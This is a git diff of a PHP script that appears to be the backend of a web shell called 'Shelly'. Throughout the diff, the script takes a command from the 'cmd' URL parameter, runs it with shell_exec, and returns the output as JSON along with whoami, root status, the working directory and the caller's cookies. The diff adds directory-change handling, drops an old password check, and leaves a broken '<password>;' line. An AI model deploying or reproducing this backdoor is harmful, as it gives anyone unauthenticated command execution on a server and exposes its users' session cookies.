@@ -1,7 +1,10 @@
 <?php
 #Classes
+$lifetime=600;
+  session_start();
+  setcookie(session_name(),session_id(),time()+$lifetime);
 	Class System{
-		protected static $password = <password>;
+		<password>;
 		
 		public function get_system_password(){
 			return self::$password;
@@ -24,17 +27,24 @@
 			return $response;
 		}
 	}
+
 	Class Server extends Conect {
 		public function __construct($get,$conection){
-			$this->cmd = $get['cmd'];
+			if(!empty($get['cmd'])){
+				$this->cmd = $get['cmd'];
+			}else{
+				$this->cmd = "";
+			}
 			$this->conection = $conection;
+			$this->pwd = $this->set_pwd();
 		}
 		public function execute(){
 			if($this->conection['response']){
-				if($this->cmd == ){
-					
+				if($this->set_execute()){
+					return 'Directory Not Found';
 				}else{
 					if(!empty(shell_exec($this->cmd))){
+						chdir($_SESSION['pwd']);
 						return shell_exec($this->cmd);
 					}else{
 						return 'Command Not Found';
@@ -45,25 +55,74 @@
 			}
 		}
 		public function set_execute(){
-			$cmd = explode($this->cmd);
-			
-			if($cmd){
-				
+			$cmd = explode(" ",$this->cmd);
+			if($cmd[0] == "cd"){
+				$pwd = $this->set_pwd($cmd[1]);
+				if($pwd == true){
+					return true;
+				}else{
+					return false;
+				}
+			}else{
+				return false;
 			}
 		}
 		public function print_working_directory(){
-			if(exec("pwd") == getcwd()){
+			$pwd_current = str_replace("../", "", $_SESSION['pwd']);
+			if($pwd_current == getcwd()){
 				$pwd = "~";
 			}else{
-				$pwd = exec($this->pwd);
+				$pwd = $pwd_current;
 			}
 			return $pwd;
 		}
-		public function set_pwd($pwd){
-			$this->pwd = $pwd;
+		public function set_pwd($pwd = null){
+			if(empty($_SESSION['pwd'])){
+				$_SESSION['pwd'] = getcwd();
+			}elseif($pwd != null){
+				if($pwd == ".."){
+					$foward = $this->foward_dir();
+					if($this->folder_exist($foward) != false){
+						$_SESSION['pwd'] = $foward;
+						return true;
+					}else{
+						return false;
+					}
+				}else{
+					if($this->folder_exist($_SESSION['pwd'].$pwd) != false){
+						$_SESSION['pwd'] = $_SESSION['pwd'].$pwd;
+						return true;
+					}else{
+						return false;
+					}
+				}
+			}
 		}
-		public function get_name(){
+		private function make_dir($dir_array){
+			$set = "";
+			for($x=0;$x<count($dir_array);$x++){
+				$set .= $dir_array[$x]."/";
+			}
+			return $set;
+		}
+		private function foward_dir(){
+			$current = explode("/",$_SESSION['pwd']);
+			unset($current[count($current)-1]);
+			return $this->make_dir($current);
+		}
+		private function rewind_dir(){
+			
+		}
+		public function folder_exist($folder){
+		    $path = realpath($folder);
+		    // If it exist, check if it's a directory
+		    return ($path !== false AND is_dir($path)) ? $path : false;
+		}
+		public function get_server_name(){
 			return $_SERVER['SERVER_NAME'];
+		}
+		public function get_user_name(){
+			return exec("whoami");
 		}
 		public function get_user_bash(){
 			if(exec("whoami") == "root"){
@@ -78,43 +137,17 @@
 $conection = new Conect($_GET);
 $server = New Server($_GET,$conection->conection());
 
-if($_GET['cmd']){
-	$response = $server->execute();
-}
 
-print_r($response);
-
-
-if(!empty($_GET)){
-	if($_GET['pass']){
-		if($_GET['pass'] == '123'){ 
-			if(!empty($_GET['a'])){
-				$command = exec($_GET['a']);
-			}
-			if(empty($command)){
-				@$command = "command not found: ".$_GET['a'];
-			}
-			
-			if(exec("whoami") == "root"){
-				$user_bash = "#";
-			}else{
-				$user_bash = "$";
-			}
-			if(exec("pwd")==getcwd()){
-				$pwd = "~";
-			}else{
-				$pwd = exec("pwd");
-			}
 			
 		$json = array("response" => "200",
-					  "server_info" => array("user"=>exec("whoami"),"server_name" => $_SERVER['SERVER_NAME'],"user_bash" => $user_bash,"pwd"=>$pwd),
-					  "command" => $command,);
-		}else{
-		
-		$json = array("response" => "302",
-					  "error" => "Invalid Password");	
-		}
+					  "cookie" => $_COOKIE,
+					  "server_info" => array("user"=>$server->get_user_name(),
+					  "server_name" => $server->get_server_name(),
+					  "user_bash" => $server->get_user_bash(),
+					  "pwd"=>$server->print_working_directory()),
+					  "command" => $server->execute(),
+					  );
 		//Response to Shelly				
 		echo json_encode($json);
-	}
-}
+	
+?>
